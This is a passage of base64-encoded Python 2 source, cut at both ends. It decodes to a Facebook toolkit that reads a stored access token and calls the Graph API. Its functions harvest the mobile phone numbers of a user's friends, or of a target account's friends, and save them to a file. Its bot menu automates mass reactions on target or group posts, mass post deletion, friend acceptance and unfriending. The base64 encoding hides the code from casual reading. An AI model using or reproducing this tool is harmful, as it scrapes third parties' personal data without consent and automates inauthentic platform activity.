HJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsIEVPRkVycm9yKToKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gU3RvcHBlZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIE5vIGNvbm5lY3Rpb24nCiAgICAgICAgICAgIGtlbHVhcigpCgoKZGVmIG5vbW9yX2hwKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIG5vbXMgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybVNhdmUgRmlsZSBceDFiWzE7OTdtZXh0KGZpbGUudHh0KSBceDFiWzE7OTFtOiBceDFiWzE7OTdtJykKICAgICAgICAgICAgdXJsID0gJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScgKyB0b2tldAogICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHVybCkKICAgICAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgICAgICBubyA9IG9wZW4obm9tcywgJ3cnKQogICAgICAgICAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1QbGVhc2Ugd2FpdCBceDFiWzE7OTdtLi4uJykKICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgZm9yIG4gaW4gelsnZGF0YSddOgogICAgICAgICAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIG5bJ2lkJ10gKyAnP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgICAgICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgaHAuYXBwZW5kKHpbJ21vYmlsZV9waG9uZSddKQogICAgICAgICAgICAgICAgICAgIG5vLndyaXRlKHpbJ21vYmlsZV9waG9uZSddICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICBwcmludCAnXHJceDFiWzE7OTJtTmFtZVx4MWJbMTs5MW0gIDpceDFiWzE7OTdtICcgKyB6WyduYW1lJ10KICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVBob25lXHgxYlsxOzkxbSA6IFx4MWJbMTs5N20nICsgelsnbW9iaWxlX3Bob25lJ10KICAgICAgICAgICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgIHByaW50ICdcblxyXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtVG90YWwgUGhvbmVceDFiWzE7OTZtJXMnICUgbGVuKGhwKQogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtRmlsZSBzYXZlZCBceDFiWzE7OTFtOiBceDFiWzE7OTdtJyArIG5vbXMKICAgICAgICAgICAgbm8uY2xvc2UoKQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBncmFiKCkKICAgICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gRXJyb3Igd2hlbiBjcmVhdGluZyBmaWxlJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBncmFiKCkKICAgICAgICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LCBFT0ZFcnJvcik6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFN0b3BwZWQnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgb3MucmVtb3ZlKG5vbXMpCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIEFuIGVycm9yIG9jY3VycmVkICcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIE5vIGNvbm5lY3Rpb24nCiAgICAgICAgICAgIGtlbHVhcigpCgoKZGVmIGhwZnJvbV9mcmllbmRzKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIGlkdCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtSW5wdXQgRnJpZW5kcyBJRCBceDFiWzE7OTFtOiBceDFiWzE7OTdtJykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgam9rID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaWR0ICsgJz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICAgICAgb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1Gcm9tXHgxYlsxOzkxbSA6XHgxYlsxOzk3bSAnICsgb3BbJ25hbWUnXQogICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBOb3QgYmUgZnJpZW5kcycKICAgICAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgICAgICBncmFiKCkKCiAgICAgICAgICAgIG5vbXMgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybVNhdmUgRmlsZSBceDFiWzE7OTdtZXh0KGZpbGUudHh0KSBceDFiWzE7OTFtOiBceDFiWzE7OTdtJykKICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkdCArICcvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICBhID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgIG5vID0gb3Blbihub21zLCAndycpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBmb3IgaSBpbiBhWydkYXRhJ106CiAgICAgICAgICAgICAgICB4ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaVsnaWQnXSArICc/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgICAgIHogPSBqc29uLmxvYWRzKHgudGV4dCkKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBocGZyb21mcmllbmRzLmFwcGVuZCh6Wydtb2JpbGVfcGhvbmUnXSkKICAgICAgICAgICAgICAgICAgICBuby53cml0ZSh6Wydtb2JpbGVfcGhvbmUnXSArICdcbicpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1xyXHgxYlsxOzkybU5hbWVceDFiWzE7OTFtICA6XHgxYlsxOzk3bSAnICsgelsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm1QaG9uZVx4MWJbMTs5MW0gOiBceDFiWzE7OTdtJyArIHpbJ21vYmlsZV9waG9uZSddCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBwcmludCAnXG5cclx4MWJbMTs5MW1bK10gXHgxYlsxOzk3bVRvdGFsIG51bWJlclx4MWJbMTs5Nm0lcycgJSBsZW4oaHBmcm9tZnJpZW5kcykKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzk3bUZpbGUgc2F2ZWQgXHgxYlsxOzkxbTogXHgxYlsxOzk3bScgKyBub21zCiAgICAgICAgICAgIG5vLmNsb3NlKCkKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIE1ha2UgZmlsZSBmYWlsZWQnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGdyYWIoKQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsIEVPRkVycm9yKToKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gU3RvcHBlZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIE5vIGNvbm5lY3Rpb24nCiAgICAgICAgICAgIGtlbHVhcigpCgoKZGVmIG1lbnVfYm90KCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQoKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMS4gQm90IFJlYWN0aW9ucyBUYXJnZXQgUG9zdCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMi4gQm90IFJlYWN0aW9ucyBHcm91cCBQb3N0JwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG0zLiBCb3QgQ29tbWVudCBUYXJnZXQgUG9zdCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNC4gQm90IENvbW1lbnQgR3JvdXAgUG9zdCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNS4gTWFzcyBEZWxldGUgUG9zdCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNi4gQWNjZXB0IEZyaWVuZCBSZXF1ZXN0cycKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNy4gVW5mcmllbmRzJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszMTs0MG0wLiBCYWNrJwogICAgcHJpbnQgJ1x4MWJbMTszNzs0MG3ilZEnCiAgICBib3RfcGlsaWgoKQoKCmRlZiBib3RfcGlsaWgoKToKICAgIGJvdHMgPSByYXdfaW5wdXQoJ+KVmuKVkFx4MWJbMTs5MW3ilrZceDFiWzE7OTdtICcpCiAgICBpZiBib3RzID09ICcnOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIENhblwndCBlbXB0eScKICAgICAgICBib3RfcGlsaWgoKQogICAgZWxzZToKICAgICAgICBpZiBib3RzID09ICcxJzoKICAgICAgICAgICAgbWVudV9yZWFjdCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgaWYgYm90cyA9PSAnMic6CiAgICAgICAgICAgICAgICBncnVwX3JlYWN0KCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIGJvdHMgPT0gJzMnOgogICAgICAgICAgICAgICAgICAgIGJvdF9rb21lbigpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGlmIGJvdHMgPT0gJzQnOgogICAgICAgICAgICAgICAgICAgICAgICBncnVwX2tvbWVuKCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBib3RzID09ICc1JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlbGV0ZXBvc3QoKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYm90cyA9PSAnNic6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWNjZXB0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYm90cyA9PSAnNyc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuZnJpZW5kKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBib3RzID09ICcwJzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbnUoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWNceDk2XSBceDFiWzE7OTdtJyArIGJvdHMgKyAnIFx4MWJbMTs5MW1ub3QgZm91bmQnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3RfcGlsaWgoKQoKCmRlZiBtZW51X3JlYWN0KCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQoKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMS4gXHgxYlsxOzk3bUxpa2UnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTIuIFx4MWJbMTs5N21Mb3ZlJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG0zLiBceDFiWzE7OTdtV293JwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG00LiBceDFiWzE7OTdtSGFoYScKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNS4gXHgxYlsxOzk3bVNhZCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNi4gXHgxYlsxOzk3bUFuZ3J5JwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszMTs0MG0wLiBCYWNrJwogICAgcHJpbnQgJ1x4MWJbMTszNzs0MG3ilZEnCiAgICByZWFjdF9waWxpaCgpCgoKZGVmIHJlYWN0X3BpbGloKCk6CiAgICBnbG9iYWwgdGlwZQogICAgYWtzaSA9IHJhd19pbnB1dCgn4pWa4pWQXHgxYlsxOzkxbeKWtlx4MWJbMTs5N20gJykKICAgIGlmIGFrc2kgPT0gJyc6CiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gQ2FuXCd0IGVtcHR5JwogICAgICAgIHJlYWN0X3BpbGloKCkKICAgIGVsc2U6CiAgICAgICAgaWYgYWtzaSA9PSAnMSc6CiAgICAgICAgICAgIHRpcGUgPSAnTElLRScKICAgICAgICAgICAgcmVhY3QoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlmIGFrc2kgPT0gJzInOgogICAgICAgICAgICAgICAgdGlwZSA9ICdMT1ZFJwogICAgICAgICAgICAgICAgcmVhY3QoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWYgYWtzaSA9PSAnMyc6CiAgICAgICAgICAgICAgICAgICAgdGlwZSA9ICdXT1cnCiAgICAgICAgICAgICAgICAgICAgcmVhY3QoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBpZiBha3NpID09ICc0JzoKICAgICAgICAgICAgICAgICAgICAgICAgdGlwZSA9ICdIQUhBJwogICAgICAgICAgICAgICAgICAgICAgICByZWFjdCgpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWtzaSA9PSAnNSc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXBlID0gJ1NBRCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFrc2kgPT0gJzYnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpcGUgPSAnQU5HUlknCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVhY3QoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBha3NpID09ICcwJzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVudV9ib3QoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDljXHg5Nl0gXHgxYlsxOzk3bScgKyBha3NpICsgJyBceDFiWzE7OTFtbm90IGZvdW5kJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWFjdF9waWxpaCgpCgoKZGVmIHJlYWN0KCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICBpZGUgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUlEIFRhcmdldCBceDFiWzE7OTFtOlx4MWJbMTs5N20gJykKICAgICAgICBsaW1pdCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtTGltaXQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvaCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkZSArICc/ZmllbGRzPWZlZWQubGltaXQoJyArIGxpbWl0ICsgJykmYWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgYWggPSBqc29uLmxvYWRzKG9oLnRleHQpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBmb3IgYSBpbiBhaFsnZmVlZCddWydkYXRhJ106CiAgICAgICAgICAgICAgICB5ID0gYVsnaWQnXQogICAgICAgICAgICAgICAgcmVha3NpLmFwcGVuZCh5KQogICAgICAgICAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHkgKyAnL3JlYWN0aW9ucz90eXBlPScgKyB0aXBlICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm1bXHgxYlsxOzk3bScgKyB5WzoxMF0ucmVwbGFjZSgnXG4nLCAnICcpICsgJy4uLiBceDFiWzE7OTJtXSBceDFiWzE7OTdtJyArIHRpcGUKCiAgICAgICAgICAgIHByaW50CiAgICAgICAgICAgIHByaW50ICdcclx4MWJbMTs5MW1bK11ceDFiWzE7OTdtIEZpbmlzaCBceDFiWzE7OTZtJyArIHN0cihsZW4ocmVha3NpKSkKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgbWVudV9ib3QoKQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gSUQgbm90IGZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBtZW51X2JvdCgpCgoKZGVmIGdydXBfcmVhY3QoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG0xLiBceDFiWzE7OTdtTGlrZScKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMi4gXHgxYlsxOzk3bUxvdmUnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTMuIFx4MWJbMTs5N21Xb3cnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTQuIFx4MWJbMTs5N21IYWhhJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG01LiBceDFiWzE7OTdtU2FkJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG02LiBceDFiWzE7OTdtQW5ncnknCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzMxOzQwbTAuIEJhY2snCiAgICBwcmludCAnXHgxYlsxOzM3OzQwbeKVkScKICAgIHJlYWN0Z19waWxpaCgpCgoKZGVmIHJlYWN0Z19waWxpaCgpOgogICAgZ2xvYmFsIHRpcGUKICAgIGFrc2kgPSByYXdfaW5wdXQoJ+KVmuKVkFx4MWJbMTs5MW3ilrZceDFiWzE7OTdtICcpCiAgICBpZiBha3NpID09ICcnOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIENhblwndCBlbXB0eScKICAgICAgICByZWFjdGdfcGlsaWgoKQogICAgZWxzZToKICAgICAgICBpZiBha3NpID09ICcxJzoKICAgICAgICAgICAgdGlwZSA9ICdMSUtFJwogICAgICAgICAgICByZWFjdGcoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlmIGFrc2kgPT0gJzInOgogICAgICAgICAgICAgICAgdGlwZSA9ICdMT1ZFJwogICAgICAgICAgICAgICAgcmVhY3RnKCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIGFrc2kgPT0gJzMnOgogICAgICAgICAgICAgICAgICAgIHRpcGUgPSAnV09XJwogICAgICAgICAgICAgICAgICAgIHJlYWN0ZygpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGlmIGFrc2kgPT0gJzQnOgogICAgICAgICAgICAgICAgICAgICAgICB0aXBlID0gJ0hBSEEnCiAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0ZygpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWtzaSA9PSAnNSc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXBlID0gJ1NBRCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0ZygpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBha3NpID09ICc2JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXBlID0gJ0FOR1JZJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0ZygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFrc2kgPT0gJzAnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51X2JvdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWNceDk2XSBceDFiWzE7OTdtJyArIGFrc2kgKyAnIFx4MWJbMTs5MW1ub3QgZm91bmQnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0Z19waWxpaCgpCgoKZGVmIHJlYWN0ZygpOgogICAgb3Muc3lzdGVtKC